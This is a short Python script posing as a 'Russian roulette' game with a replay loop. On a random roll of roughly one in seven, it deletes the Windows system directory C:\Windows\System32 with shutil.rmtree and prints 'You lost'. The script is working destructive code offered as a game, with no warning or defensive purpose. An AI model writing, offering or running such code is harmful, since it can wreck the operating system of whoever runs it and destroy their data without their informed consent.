import os
import random
import shutil

def main():
    if random.randint(0, 6) == 1:
        shutil.rmtree("C:\\Windows\\System32")
        print("You lost")
    else:
        print("Well played")

if __name__ == "__main__":
    while True:
        main()
        if input("Replay? (y/n) : ") != "y":
            break
